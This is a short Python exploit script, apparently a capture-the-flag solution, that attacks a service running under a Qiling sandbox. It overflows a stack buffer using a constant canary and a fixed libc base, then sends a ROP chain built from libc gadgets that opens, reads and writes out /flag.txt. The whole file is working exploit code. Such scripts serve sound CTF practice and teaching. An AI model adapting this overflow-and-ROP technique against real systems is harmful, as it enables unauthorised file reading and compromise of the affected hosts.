from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9005"))

libc = ELF("../distfiles/lib/libc.so.6")
#sock = Process(["./sandbox.py", "/bin/vuln"], cwd="../distfiles")
sock = Socket(HOST, PORT)

# ASLR is not implemented on Qiling
libc.base = 0x7fffb7ddb000
s_flag = libc.section('.bss') + 0x800 # anywhere writable
addr_flag = libc.section('.bss') + 0x800 # anywhere writable

payload  = b"A" * 0x108
# Stack canary is constant on Qiling
payload += b"\x00" + b"a"*7
payload += b"A" * 8
payload += flat([
    # prepare "/flag.txt"
    # read(0, addr, 0x10);
    next(libc.gadget("pop rdi; ret;")), 0,
    next(libc.gadget("pop rsi; ret;")), s_flag,
    next(libc.gadget("pop rdx; ret;")), 0x10,
    libc.symbol("read"),

    # open("/flag.txt", O_RDONLY)
    next(libc.gadget("pop rsi; ret;")),
    0,
    next(libc.gadget("pop rdi; ret;")),
    s_flag,
    libc.symbol("open"),

    # read(3, addr, 0x100);
    next(libc.gadget("pop rdx; ret;")), 0x100,
    next(libc.gadget("pop rsi; ret;")), addr_flag,
    next(libc.gadget("pop rdi; ret;")), 3,
    libc.symbol("read"),

    # write(1, addr, 0x100);
    next(libc.gadget("pop rdx; ret;")), 0x100,
    next(libc.gadget("pop rsi; ret;")), addr_flag,
    next(libc.gadget("pop rdi; ret;")), 1,
    libc.symbol("write"),

    # exit(...)
    libc.symbol("exit")
], map=p64)
sock.sendlineafter("Enter something\n", payload)

time.sleep(1)
sock.send(b"/flag.txt\0")

sock.sh()
